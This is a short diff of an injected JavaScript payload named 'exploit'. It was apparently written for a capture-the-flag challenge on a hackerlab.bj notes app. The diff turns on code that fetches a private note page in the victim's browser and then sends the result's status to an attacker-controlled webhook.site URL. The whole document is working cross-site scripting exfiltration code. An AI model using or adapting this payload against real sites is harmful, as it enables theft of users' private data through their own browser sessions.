@@ -1,7 +1,7 @@
 <script>
 (async function exploit() {
     try {
-        /*var dt = await fetch("https://xnotes.qualif.hackerlab.bj/note.php?id=845");
+        var dt = await fetch("https://xnotes.qualif.hackerlab.bj/note.php?id=845");
 
         var statusCode = dt.status;
 
@@ -18,15 +18,9 @@
             body: text
         };
 
-        var jsonData = JSON.stringify(res);*/
+        var jsonData = JSON.stringify(res);
 
-        var lol = await fetch("https://webhook.site/fd1dc2df-9cbd-40af-bf86-c38063a985e0", {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({"test": "test_html"})
-        });
+        var lol = await fetch("https://webhook.site/fd1dc2df-9cbd-40af-bf86-c38063a985e0/?id=" + dt.status);
     } catch (error) {
         console.error('Error:', error);
     }
